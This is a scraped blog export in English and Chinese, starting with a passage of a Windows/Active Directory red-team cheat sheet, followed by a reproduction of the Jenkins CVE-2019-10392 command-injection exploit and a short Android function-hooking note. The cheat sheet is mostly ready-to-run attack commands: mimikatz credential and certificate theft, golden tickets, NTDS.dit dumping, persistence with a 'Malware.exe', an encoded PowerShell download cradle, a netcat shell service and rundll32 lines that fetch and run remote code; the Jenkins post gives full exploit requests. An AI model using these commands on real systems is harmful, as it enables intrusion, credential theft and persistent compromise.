Kiwi\\AppData\\Roaming\\Microsoft\\SystemCertificates\\My\\Certificates\\B53C6DE283C00203587A03DD3D0BF66E16969A55&quot; &#x2F;export dpapi::capi &#x2F;in:&quot;D:\\Users\\Gentil Kiwi\\AppData\\Roaming\\Microsoft\\Crypto\\RSA\\S-1-5-21-494464150-3436831043-1864828003-1001\\79e1ac78150e8bea8ad238e14d63145b_4f8e7ec6-a506-4d31-9d5a-1e4cbed4997b&quot; dpapi::masterkey &#x2F;in:&quot;D:\\Users\\Gentil Kiwi\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-494464150-3436831043-1864828003-1001\\1eccdbd2-4771-4360-8b19-9d6060a061dc&quot; &#x2F;password:waza1234&#x2F; dpapi::capi &#x2F;in:&quot;D:\\Users\\Gentil Kiwi\\AppData\\Roaming\\Microsoft\\Crypto\\RSA\\S-1-5-21-494464150-3436831043-1864828003-1001\\79e1ac78150e8bea8ad238e14d63145b_4f8e7ec6-a506-4d31-9d5a-1e4cbed4997b&quot; &#x2F;masterkey:f2c9ea33a990c865e985c496fb8915445895d80b openssl x509 -inform DER -outform PEM -in B53C6DE283C00203587A03DD3D0BF66E16969A55.der -out public.pem openssl rsa -inform PVK -outform PEM -in raw_exchange_capi_0_ffb75517-bc6c-4a40-8f8b-e2c555e30e34.pvk -out private.pem openssl pkcs12 -in public.pem -inkey private.pem -password pass:mimikatz -keyex -CSP &quot;Microsoft Enhanced Cryptographic Provider v1.0&quot; -export -out cert.pfx certutil -user -p mimikatz -importpfx cert.pfx NoChain,NoRoot UAC Bypasshttps:&#x2F;&#x2F;egre55.github.io&#x2F;system-properties-uac-bypass&#x2F; - Read Ghoul writeup on HTB for more Info findstr &#x2F;C:&quot;&lt;autoElevate&gt;true&quot; C:\\Windows\\SysWOW64\\SystemPropertiesAdvanced.exe C:\\Windows\\SysWOW64\\SystemPropertiesComputerName.exe C:\\Windows\\SysWOW64\\SystemPropertiesHardware.exe C:\\Windows\\SysWOW64\\SystemPropertiesProtection.exe C:\\Windows\\SysWOW64\\SystemPropertiesRemote.exe Golden Ticket Attack#Check my Blog Post Kerberos Attacks in Depth for Further Information #https:&#x2F;&#x2F;m0chan.github.io&#x2F;Kerberos-Attacks-In-Depth # To generate the TGT with NTLM mimikatz # kerberos::golden &#x2F;domain:&lt;domain_name&gt;&#x2F;sid:&lt;domain_sid&gt; &#x2F;rc4:&lt;krbtgt_ntlm_hash&gt; &#x2F;user:&lt;user_name&gt; # To generate the TGT with AES 128 key mimikatz # kerberos::golden &#x2F;domain:&lt;domain_name&gt;&#x2F;sid:&lt;domain_sid&gt; &#x2F;aes128:&lt;krbtgt_aes128_key&gt; &#x2F;user:&lt;user_name&gt; # To generate the TGT with AES 256 key (more secure encryption, probably more stealth due is the used by default by Microsoft) mimikatz # kerberos::golden &#x2F;domain:&lt;domain_name&gt;&#x2F;sid:&lt;domain_sid&gt; &#x2F;aes256:&lt;krbtgt_aes256_key&gt; &#x2F;user:&lt;user_name&gt; # Inject TGT with Mimikatz mimikatz # kerberos::ptt &lt;ticket_kirbi_file&gt; #Inject Ticket with Rebeus .\\Rubeus.exe ptt &#x2F;ticket:&lt;ticket_kirbi_file&gt; .\\PsExec.exe -accepteula \\\\&lt;remote_hostname&gt; cmd Child Domain to Forest CompromiseDomain &#x3D; Logical group of objects (users, computers, servers etc etc) supported from a central location like a DC Tree &#x3D; Set of domains using same name space (DNS Name) Trust &#x3D; Agreement between 2 domains that allow cross-domain access to resources etc. i&#x2F;e Michelle@dev.m0chan.com may be able to access resources inside HR.m0chan.com. Forest &#x3D; Largest Structure composed of all trees. Most trees are linked with dual sided trust relationships to allow for sharing of resources. By default the first domain created if the Forest Root. Lets say we have owned a domain controller and got the KRBTGT Hash (The keys to the castle) we can now create Covert-NameToSid target.domain.com\\krbtgt S-1-5-21-2941561648-383941485-1389968811-502 Replace 502 with 519 to represent Enterprise Admins Create golden ticket and attack parent domain. This will not work if there is SID Filtering in place for respective target domain. harmj0ys article explains it best. #http:&#x2F;&#x2F;www.harmj0y.net&#x2F;blog&#x2F;redteaming&#x2F;a-guide-to-attacking-domain-trusts&#x2F; Dump NTDS.ditC:\\vssadmin create shadow &#x2F;for&#x3D;C: copy \\\\? \\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy[DISK_NUMBER]\\windows\\ntds\\ntds.dit . copy \\\\? \\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy[DISK_NUMBER]\\windows\\system32\\config\\SYSTEM . copy \\\\? \\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy[DISK_NUMBER]\\windows\\system32\\config\\SAM . reg SAVE HKLM\\SYSTEM c:\\SYS vssadmin delete shadows &#x2F;for&#x3D; [&#x2F;oldest | &#x2F;all | &#x2F;shadow&#x3D;] If you pwn a BackupOperator account with SeBackupPrivilege you can also dump NTDS.dit SeBackupPrivlege - Dump NTDS.ditImport-Module .\\SeBackupPrivilegeCmdLets.dll Import-Module .\\SeBackupPrivilegeUtils.dll PS C:\\m0chan&gt; Get-SeBackupPrivilege SeBackupPrivilege is disabled PS C:\\m0chan&gt; Set-SeBackupPrivilege PS C:\\m0chan&gt; Get-SeBackupPrivilege SeBackupPrivilege is enabled PS C:\\m0chan&gt; Copy-FileSeBackupPrivilege P:\\Windows\\System32\\ntds.dit C:\\m0chan\\ntds.dit -Overwrite Copied 12582912 bytes Use diskshadow to mount a shadow copy and then copy Windows\\system32\\ntds.dit Remember and not use C:\\Windows\\ntds\\ntds.dit reg.exe save hklm\\system c:\\m0chan\\SYSTEM.bak PersistanceSSH Shuttle.&#x2F;run -r root@10.10.110.123 172.16.1.0&#x2F;24 -e &quot;ssh -i Root.key&quot; SharPersist#https:&#x2F;&#x2F;github.com&#x2F;fireeye&#x2F;SharPersist C# Libary Designed by FireEye to aid with Persistance using various techniques such as KeePass Backdoor Reg Key Sch Task Backdoor Startup Folder (Link File) Service Backdoor See there github linked above for full Syntax, very cool work SharpDoor#https:&#x2F;&#x2F;github.com&#x2F;infosecn1nja&#x2F;SharpDoor.git SharpDoor is alternative RDPWrap written in C# to allowed multiple RDP (Remote Desktop) sessions by patching termsrv.dll file, for opsec considerations SharpDoor still using cmd.exe to run sc services to impersonating as trustedinstaller in the future will be avoiding cmd.exe usage, currently only support for Windows 10. execute-assembly &#x2F;root&#x2F;Toolkits&#x2F;SharpBinaries&#x2F;SharpDoor.exe AutoRun Registry[HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run] [HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce] [HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices] [HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce] [HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon] [HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run] [HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce] [HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices] [HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce] [HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon] Run &amp; Run Oncereg add &quot;HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run&quot; &#x2F;v WindowsUpdate &#x2F;t REG_SZ &#x2F;d &quot;C:\\Temp\\SoftwareUpdate\\Malware.exe&quot; Scheduled Tasks#Note - Beaware. some EDR&#x2F;Endpoint Solutions detect Scheduled Tasks being created and trigger alerts. schtasks &#x2F;create &#x2F;sc minute &#x2F;mo 1 &#x2F;tn &quot;Malware&quot; &#x2F;tr C:\\Temp\\SoftwareUpdate\\Malware.exe This will run Malware.exe every minute forever. # Run Malware.exe every day at 06:00am schtasks &#x2F;create &#x2F;tn &quot;SoftwareUpdate&quot; &#x2F;tr C:\\Temp\\SoftwareUpdate\\Malware.exe &#x2F;sc daily &#x2F;st 06:00 # Runs a task each time the user&#39;s session is idle for 5 minutes. schtasks &#x2F;create &#x2F;tn &quot;SoftwareUpdate&quot; &#x2F;tr C:\\Temp\\SoftwareUpdate\\Malware.exe &#x2F;sc onidle &#x2F;i 5 # Runs a a task as SYSTEM when User Logs in. schtasks &#x2F;create &#x2F;ru &quot;NT AUTHORITY\\SYSTEM&quot; &#x2F;rp &quot;&quot; &#x2F;tn &quot;SoftwareUpdate&quot; &#x2F;tr C:\\Temp\\SoftwareUpdate\\Malware.exe &#x2F;sc onlogon Windows Startup FolderThis has been around for years as basically every version of Windows contains a startup folder. Windows 10 - C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp Current User Startup - C:\\Users\\Username\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup EXE/DLL HijackingLook for any missing DLL&#39;s or EXE&#39;s that common programs are calling on startup and over write them with your payload&#x2F;malware. Also if you are localadmin&#x2F;system you could provide over write a normal service binary or DLL, providing you don&#39;t break the execution. Add User Accountnet user m0chan &#x2F;add &#x2F;domain net group &quot;Domain Admins&quot; m0chan &#x2F;add &#x2F;domain net localgroup &quot;Administrators&quot; &#x2F;add net user m0chan &#x2F;domain &#x2F;comment:&quot;Your Blueteam Fucking Sucks&quot; Persistence with KerberosWe can dump Kerberos tickets and inject them in session when deemed relevant however tickets have a low life span unless explically requested for 7 days. They can be injected into session with mimikatz or Rebeus. But let&#39;s say we have pwned a DC and got the KRBTGT Hash we can generate a golden ticket with a 10 year life span. kerberos::golden &#x2F;user:utilisateur &#x2F;domain:chocolate.local &#x2F;sid:S-1-5-21-130452501-2365100805-3685010670 &#x2F;krbtgt:310b643c5316c8c3c70a10cfb17e2e31 &#x2F;ticket:utilisateur.chocolate.kirbi SID is the domain SID Inject Ticket kerberos::ptt Administrateur@krbtgt-CHOCOLATE.LOCAL.kirbi Can also inject kirbi with Rebeus Lateral MovementPlinkplink.exe -l root -pw password -R 445:127.0.0.1:445 YOURIPADDRESS #Windows 1803 Built in SSH Client (By Default) ssh -l root -pw password -R 445:127.0.0.1:445 YOURIPADDRESS Powershell Port Forwardnetsh interface portproxy add v4tov4 listenport&#x3D;fromport listenaddress&#x3D;fromip connectport&#x3D;toport connectaddress&#x3D;toip Permanent ^^ Requires iphlpsvc service to be enabled fromport: the port number to listen on, e.g. 80 fromip: the ip address to listen on, e.g. 192.168.1.1 toport: the port number to forward to toip: the ip address to forward to Invoke-SocksProxy#https:&#x2F;&#x2F;github.com&#x2F;p3nt4&#x2F;Invoke-SocksProxy&#x2F; Local Socks4 Proxy on 1080 Import-Module .\\Invoke-SocksProxy.psm1 Invoke-SocksProxy -bindPort 1080 Reverse Socks Proxy on Remote Machine Port 1080 # On the remote host: # Generate a private key and self signed cert openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout private.key -out cert.pem # Get the certificate fingerprint to verify it: openssl x509 -in cert.pem -noout -sha1 -fingerprint | cut -d &quot;&#x3D;&quot; -f 2 | tr -d &quot;:&quot; # Start the handler python ReverseSocksProxyHandler.py 443 1080 .&#x2F;cert.pem .&#x2F;private.key # On the local host: Import-Module .\\Invoke-SocksProxy.psm1 Invoke-ReverseSocksProxy -remotePort 443 -remoteHost 192.168.49.130 # Go through the system proxy: Invoke-ReverseSocksProxy -remotePort 443 -remoteHost 192.168.49.130 -useSystemProxy # Validate certificate Invoke-ReverseSocksProxy -remotePort 443 -remoteHost 192.168.49.130 -useSystemProxy -certFingerprint &#39;93061FDB30D69A435ACF96430744C5CC5473D44E&#39; Socat for Windows#https:&#x2F;&#x2F;github.com&#x2F;StudioEtrange&#x2F;socat-windows Generate SSL Cert for Encryption openssl req -new -x509 -days 365 -nodes -out cert.pem -keyout cert.key Server : socat OPENSSL-LISTEN:443,cert&#x3D;&#x2F;cert.pem - Client : socat - OPENSSL:localhost:443 #Port Forward socat OPENSSL-LISTEN:443,cert&#x3D;&#x2F;cert.pem,fork TCP:202.54.1.5:443 All SSL Connections will be redirected to 202.54.1.5:443 #Non SSL Port Forward socat TCP-LISTEN:80,fork TCP:202.54.1.5:80 SharpExec#https:&#x2F;&#x2F;github.com&#x2F;anthemtotheego&#x2F;SharpExec C# Implementation of Conventional Lateral Movement Techniques, such as -WMIExec - Semi-Interactive shell that runs as the user. Best described as a less mature version of Impacket&#39;s wmiexec.py tool. -SMBExec - Semi-Interactive shell that runs as NT Authority\\System. Best described as a less mature version of Impacket&#39;s smbexec.py tool. -PSExec (like functionality) - Gives the operator the ability to execute remote commands as NT Authority\\System or upload a file and execute it with or without arguments as NT Authority\\System. -WMI - Gives the operator the ability to execute remote commands as the user or upload a file and execute it with or without arguments as the user. Secure Sockets Funneling#https:&#x2F;&#x2F;0xdf.gitlab.io&#x2F;2019&#x2F;01&#x2F;28&#x2F;tunneling-with-chisel-and-ssf.html#ssf #git clone https:&#x2F;&#x2F;github.com&#x2F;securesocketfunneling&#x2F;ssf.git Massive shout out to 0xdf for explaining this perfectly in his article. Couldnt have done it better myself. Chisel (Fast TCP Tunnel over HTTP secured by SSH)#https:&#x2F;&#x2F;0xdf.gitlab.io&#x2F;2019&#x2F;01&#x2F;28&#x2F;tunneling-with-chisel-and-ssf.html CrackMapExec#https:&#x2F;&#x2F;www.ivoidwarranties.tech&#x2F;posts&#x2F;pentesting-tuts&#x2F;cme&#x2F;crackmapexec-lateral-movement&#x2F; WMIC Spawn Processwmic &#x2F;node:WS02 &#x2F;user:DOMAIN\\m0chan &#x2F;password:m0chan process call create &quot;powershell.exe -Enc aQBlAHgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADQALgA2AC8ARwBvAG8AZABuAGkAZwBoAHQALgBwAHMAMQAiACkAKQA7ACAAaQBmACgAWwBCAHkAcABhAHMAcwAuAEEATQBTAEkAXQA6ADoARABpAHMAYQBiAGwAZQAoACkAIAAtAGUAcQAgACIAMAAiACkAIAB7ACAAaQBlAHgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADQALgA2AC8ASABSAEUAdgBlAG4AdABzAC4AcABzADEAIgApACkAIAB9AA&#x3D;&#x3D;&quot; WinRS#https:&#x2F;&#x2F;docs.microsoft.com&#x2F;en-us&#x2F;windows-server&#x2F;administration&#x2F;windows-commands&#x2F;winrs winrs [&#x2F;&lt;parameter&gt;[:&lt;value&gt;]] &lt;command&gt; winrs &#x2F;r:https:&#x2F;&#x2F;contoso.com command winrs &#x2F;r:http:&#x2F;&#x2F;[1080:0:0:0:8:800:200C:417A]:80 command winrs &#x2F;r:myserver &#x2F;ad &#x2F;u:administrator &#x2F;p:$%fgh7 dir \\\\anotherserver\\share Invoke-WMIExec.ps1Invoke-WMIExec -Target 10.10.14.14 -Username rweston_da -Hash 3ff61fa259deee15e4042159d 7b832fa -Command &quot;net user user pass &#x2F;add &#x2F;domain&quot; PS C:\\users\\user\\Downloads&gt; Invoke-WMIExec -Target 10.10.120.1 -Username m0chan -Hash 3ff61fa259deee15e4042159d 7b832fa -Command &quot;net group &quot;&quot;Domain Admins&quot;&quot; m0chan &#x2F;add &#x2F;domain&quot; Powershell Invoke-Command (Requires Port 5985)$secpasswd &#x3D; ConvertTo-SecureString &#39;pass&#39; -AsPlainText -Force $cred &#x3D; New-Object System.Management.Automation.PSCredential(&#39;m0chan\\user&#39;, $secpasswd) Invoke-Command -ComputerName FS01 -Credential $cred -ScriptBlock &#123;whoami&#125; PSExecpsexec.exe \\\\dc01.m0chanAD.local cmd.exe Powershell Remoting$secpasswd &#x3D; ConvertTo-SecureString &#39;password&#39; -AsPlainText -Force $cred &#x3D; New-Object System.Management.Automation.PSCredential(&#39;WS02\\USER&#39;, $secpasswd) $Session &#x3D; New-PSSession -ComputerName FileServer -Credential $cred Enter-PSSession $Session Configure Remote Service over SMB (Requires Local Admin on Target Machine)net use \\\\192.168.0.15 [password] &#x2F;u:DOMAIN\\m0chan sc \\\\192.168.0.15 create &lt;service_name&gt; binpath&#x3D; &quot;cmd.exe &#x2F;k COMMAND&quot; sc \\\\192.168.0.15 create &lt;service_name&gt; binpath&#x3D; &quot;cmd.exe &#x2F;k &lt;c:\\tools\\nc.exe -L -p &lt;port&gt; -e cmd.exe&gt;&quot; sc \\\\192.168.0.15 start &lt;service_name&gt; Pass-The-Hashcrackmapexec &lt;ip&gt; -u &lt;user&gt; -H &quot;&lt;lm&gt;&quot; -x &quot;&lt;msfvenom psh-cmd&gt;&quot; impacket-wmiexec &lt;user&gt;@&lt;ip&gt; -hashes &lt;lm:nt&gt; pth-winexe -U &lt;user&gt;%&lt;ntlm&gt; &#x2F;&#x2F;&lt;ip&gt; &quot;&lt;msfvenom psh-cmd&gt;&quot; python wmiexec.py -hashes :&lt;hash&gt; &lt;user&gt;@&lt;ip&gt; xfreerdp &#x2F;u:&lt;user&gt; &#x2F;d:&lt;domain&gt; &#x2F;pth:&lt;ntlm&gt; &#x2F;v:&lt;ip&gt;:3389 &#x2F;dynamic-resolution sekurlsa::pth &#x2F;user:Administrateur &#x2F;domain:chocolate.local &#x2F;ntlm:cc36cf7a8514893efccd332446158b1a Pass-The-Ticket#Check my Blog Post Kerberos Attacks in Depth for Further Information Rebeus monitor &#x2F;interval:30 Monitoring logon sessions every 30 seconds so I can pinch Kerb tickets Reubus will now give you a Kerberos ticket in base64 which you can pass with Rubeus.exe ptt &#x2F;ticket:[base64blobhere] We can now request TGS service tickets to access network resources as this user Obfuscation / Evasion TechniquesInvoke-Obfusaction#https:&#x2F;&#x2F;github.com&#x2F;danielbohannon&#x2F;Invoke-Obfuscation Can obfusacte Scripts &amp; Commands Obfusacte script from remote url SET SCRIPTPATH https:&#x2F;&#x2F;thisdosentexist.m0chan.com&#x2F;Invoke-Mimikatz.ps1 Can also set Sscript block base64 PS SET SCRIPTBLOCK powershell -enc VwByAGkAdABlAC0ASABvAHMAdAAgACcAWQBvAHUAIABjAGEAbgAgAHUAcwBlACAAYgBhAHMAaQBjACAALQBlAG4A&#x3D;&#x3D; Invoke-CradleCraft#https:&#x2F;&#x2F;github.com&#x2F;danielbohannon&#x2F;Invoke-CradleCrafter Similar to Invoke-Obfusaction but allows you to obfusacte cradles for downloading i&#x2F;e IEX (New-Object Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;c2server.com&#x2F;Invoke-Mimikatz.ps1&#39;) Invoke-DOSfuscation#https:&#x2F;&#x2F;github.com&#x2F;danielbohannon&#x2F;Invoke-DOSfuscation Unicornhttps://github.com/trustedsec/unicorn unicorn.py Nishang.ps1 AppLocker / Constrained Mode BypassesVerify is you are in constrained mode$ExecutionContext.SessionState.LanguageMode PowershellVeryLess Bypassgit clone https:&#x2F;&#x2F;github.com&#x2F;decoder-it&#x2F;powershellveryless.git C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe &#x2F;reference: C:\\Windows\\Microsoft.NET\\assembly\\GAC_MSIL\\System.Management.Automation\\v4.0_3.0.0.0__31bf3856ad364e35\\system.management.automation.dll &#x2F;out:C:\\Users\\m0chan\\Scripts\\powershellveryless.exe C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe &#x2F;reference:C:\\Windows\\Microsoft.NET\\assembly\\GAC_MSIL\\System.Management.Automation\\v4.0_3.0.0.0__31bf3856ad364e35\\system.management.automation.dll &#x2F;out:c:\\setup\\powershellveryless.exe c:\\scripts\\powershellveryless.cs Execute -&gt; powershellveryless.exe script.ps1 script.ps1 &#x3D; Script of your Choice World Writable Folders (By Default on Windows 10 1803)#https:&#x2F;&#x2F;github.com&#x2F;api0cradle&#x2F;UltimateAppLockerByPassList&#x2F;blob&#x2F;master&#x2F;Generic-AppLockerbypasses.md C:\\Windows\\Tasks C:\\Windows\\Temp C:\\windows\\tracing C:\\Windows\\Registration\\CRMLog C:\\Windows\\System32\\FxsTmp C:\\Windows\\System32\\com\\dmp C:\\Windows\\System32\\Microsoft\\Crypto\\RSA\\MachineKeys C:\\Windows\\System32\\spool\\PRINTERS C:\\Windows\\System32\\spool\\SERVERS C:\\Windows\\System32\\spool\\drivers\\color C:\\Windows\\System32\\Tasks\\Microsoft\\Windows\\SyncCenter C:\\Windows\\SysWOW64\\FxsTmp C:\\Windows\\SysWOW64\\com\\dmp C:\\Windows\\SysWOW64\\Tasks\\Microsoft\\Windows\\SyncCenter C:\\Windows\\SysWOW64\\Tasks\\Microsoft\\Windows\\PLA\\System Downgrade AttackDowngrading to PS Version 2 circumvates Constrained Mode powershell.exe -version 2 Verifiy versions with $PSVersionTable Get-Host AppLocker COR Profile Bypassset COR_ENABLE_PROFILING&#x3D;1 COR_PROFILER&#x3D;&#123;cf0d821e-299b-5307-a3d8-b283c03916db&#125; set COR_PROFILER_PATH&#x3D;C:\\Users\\m0chan\\pwn\\reverseshell.dll tzsync powershell Where .DLL is your payload i&#x2F;e reverse shell, beacon etc. MSBuild Powershell/CMD BypassYou can use this if cmd is not disabled but powershell is https:&#x2F;&#x2F;github.com&#x2F;Cn33liz&#x2F;MSBuildShell&#x2F;blob&#x2F;master&#x2F;MSBuildShell.csproj C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe pshell.csproj Also https:&#x2F;&#x2F;gist.github.com&#x2F;NickTyrer&#x2F;92344766f1d4d48b15687e5e4bf6f93c MSBuild PSAttack :D :D PSAttack#https:&#x2F;&#x2F;github.com&#x2F;jaredhaight&#x2F;PSAttack Use if Powershell.exe is not available. this does not rely on powershell.exe, but Instead directly calls powershell through .NET Framework circumvating most application whitelisting etc. Has numerous modules prebuilt in and is built in C Sharp &#x2F; .NET so can be reflectively loaded :) NoPowerShell#https:&#x2F;&#x2F;github.com&#x2F;bitsadmin&#x2F;nopowershell Primiarily to be used with Cobalt &amp; Execute Assembly but can also be reflectively loaded from any other C2 infra. runDLL32 Bypass#Reference: https:&#x2F;&#x2F;oddvar.moe&#x2F;2017&#x2F;12&#x2F;13&#x2F;applocker-case-study-how-insecure-is-it-really-part-1&#x2F; rundll32.exe is a .exe found on all Windows based systems located at C:\\Windows\\system32\\rundll32.exe rundll32 shell32.dll,Control_RunDLL payload.dll rundll32.exe javascript:&quot;\\..\\mshtml,RunHTMLApplication &lt;HTML Code&gt; rundll32.exe javascript:&quot;\\..\\mshtml,RunHTMLApplication &quot;;document.write();new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;ip:port&#x2F;&#39;);&quot; rundll32.exe javascript:&quot;\\..\\mshtml.dll,RunHTMLApplication &quot;;eval(&quot;w&#x3D;new%20ActiveXObject(\\&quot;WScript.Shell\\&quot;);w.run(\\&quot;calc\\&quot;);window.close()&quot;); rundll32.exe javascript:&quot;\\..\\mshtml,RunHTMLApplication &quot;;document.write();h&#x3D;new%20ActiveXObject(&quot;WScript.Shell&quot;).run(&quot;calc.exe&quot;,0,true);try&#123;h.Send();b&#x3D;h.ResponseText;eval(b);&#125;catch(e)&#123;new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd &#x2F;c taskkill &#x2F;f &#x2F;im rundll32.exe&quot;,0,true);&#125; rundll32.exe javascript:&quot;\\..\\mshtml,RunHTMLApplication &quot;;document.write();GetObject(&quot;script:https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;3gstudent&#x2F;Javascript-Backdoor&#x2F;master&#x2F;test&quot;)","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"https://misakikata.github.io/tags/web%E5%AE%89%E5%85%A8/"}]},{"title":"CVE-2019-10392 Jenkins 2k19认证远程RCE","slug":"CVE-2019-10392-Jenkins-2k19认证远程RCE","date":"2019-09-16T00:53:35.000Z","updated":"2019-09-16T00:55:29.000Z","comments":true,"path":"2019/09/CVE-2019-10392-Jenkins-2k19认证远程RCE/","link":"","permalink":"https://misakikata.github.io/2019/09/CVE-2019-10392-Jenkins-2k19%E8%AE%A4%E8%AF%81%E8%BF%9C%E7%A8%8BRCE/","excerpt":"","text":"CVE-2019-10392 Jenkins 2k19认证远程RCE使用以下命令在本地使用Docker启动了Jenkins实例： docker run -p 8080:8080 -p 50000:50000 jenkins&#x2F;jenkins:lts-alpine 版本为：Jenkins 2.176.3 git客户端：http://updates.jenkins-ci.org/download/plugins/git-client/2.8.2/git-client.hpi git插件：http://updates.jenkins-ci.org/download/plugins/git/3.12.0/git.hpi 由于官方已经升级了client为2.8.5，git升级到3.12.1。所以需要手动上传插件，上传完成后如下。 新建用户user 为账号配置权限，作者这里没看到给了create权限，如果需要使用普通账号来创建任务测试，则需要给create权限，或者已有任务的情况下来操作已有任务也是可以的，就不用给create权限，此处用create来测试。 登陆user用户，可以看到用户界面如此 如下选择 在SCM中选择git执行 查看git-ls-remote文档，从给的参数中可以注意到–upload-pack=。看起来像是执行了某些命令，而漏洞作者也是看到了这个参数的形式而采用了这个参数执行。 https://git-scm.com/docs/git-ls-remote.html 参数的意义是：在远程主机上指定git-upload-pack的完整路径。这允许列出通过SSH访问的存储库中的引用，以及SSH守护程序不使用用户配置的PATH的位置。 如此，执行--upload-pack=&quot;`id`&quot; 可以看到命令已经执行。 至于请求测试的话，和原作者得到写法有点出入，暂不知为何，但可以使用如下方式，请求如下，其中test2为任务名，获取Jenkins-Crumb GET &#x2F;job&#x2F;test2&#x2F;configure HTTP&#x2F;1.1 Host: 192.168.253.139:8080 Upgrade-Insecure-Requests: 1 DNT: 1 User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;76.0.3809.100 Safari&#x2F;537.36 Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3 Referer: http:&#x2F;&#x2F;192.168.253.139:8080&#x2F;job&#x2F;test2&#x2F; Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q&#x3D;0.9,en;q&#x3D;0.8 Cookie: screenResolution&#x3D;1536x864; JSESSIONID.b4706a48&#x3D;node013tshj9ds2r3kr18mgmyaquc114.node0; JSESSIONID.83272e09&#x3D;node0dt5602fpgb3a108885vr3228h9.node0 Connection: close 然后把获得的”Jenkins-Crumb”，携带到请求中 POST &#x2F;job&#x2F;test2&#x2F;descriptorByName&#x2F;hudson.plugins.git.UserRemoteConfig&#x2F;checkUrl HTTP&#x2F;1.1 Host: 192.168.253.139:8080 Content-Length: 51 Origin: http:&#x2F;&#x2F;192.168.253.139:8080 Jenkins-Crumb: b2ecec81285edce6716900a2d4e1b687 User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;76.0.3809.100 Safari&#x2F;537.36 Content-type: application&#x2F;x-www-form-urlencoded; charset&#x3D;UTF-8 Accept: text&#x2F;javascript, text&#x2F;html, application&#x2F;xml, text&#x2F;xml, *&#x2F;* X-Prototype-Version: 1.7 X-Requested-With: XMLHttpRequest DNT: 1 Referer: http:&#x2F;&#x2F;192.168.253.139:8080&#x2F;job&#x2F;test2&#x2F;configure Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q&#x3D;0.9,en;q&#x3D;0.8 Cookie: screenResolution&#x3D;1536x864; JSESSIONID.b4706a48&#x3D;node013tshj9ds2r3kr18mgmyaquc114.node0; JSESSIONID.83272e09&#x3D;node0dt5602fpgb3a108885vr3228h9.node0 Connection: close value&#x3D;--upload-pack%3D%22%60id%60%22&amp;credentialsId&#x3D; 原文：https://iwantmore.pizza/posts/cve-2019-10392.html","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"https://misakikata.github.io/tags/web%E5%AE%89%E5%85%A8/"}]},{"title":"Android Java Hook","slug":"Android-Java-Hook","date":"2019-09-16T00:52:55.000Z","updated":"2019-09-16T00:55:47.000Z","comments":true,"path":"2019/09/Android-Java-Hook/","link":"","permalink":"https://misakikata.github.io/2019/09/Android-Java-Hook/","excerpt":"","text":"使用Inspeckage尝试hook其中的加密函数环境：夜神模拟器Inspeckage 2.3某收件APP 获取关键参数安装app后，抓包看到如下参数 在AK中搜索其中关键词fm和sign，搜索中发现sign过多，于是尝试搜索FM，搜索中发现如下class文件。 打开Java源代码，在其中的一个void类型的b函数中发现关键。 打开对应文件的sha256函数 基本可以确定加密算法为这个，对其中的三个参数加盐来sha256 paramString1对应了localObject5，也就是timestamp paramString2对应了localObject4，也就是nonce paramString3对应了localObject2，也是其中暂不得知道为何的参数 这几个参数，其中sign是不得知为什么参数，其他一个为uuid，一个为时间戳，于是我们尝试hook这个函数。 配置HOOK在Inspeckage的界面中选着HOOK，点击找到左侧加载出来的函数方法 点击后如下，添加 在模拟器中做一个请求，此处仍然使用之前的登陆请求，hook到的参数和结果 其中result就是抓包到的请求sign参数，可以看到参数paramString3为一串拼接的字符串，其中密码为MD5加密，在hash选项中可以看到加密的原参数，和sha256用到的salt值 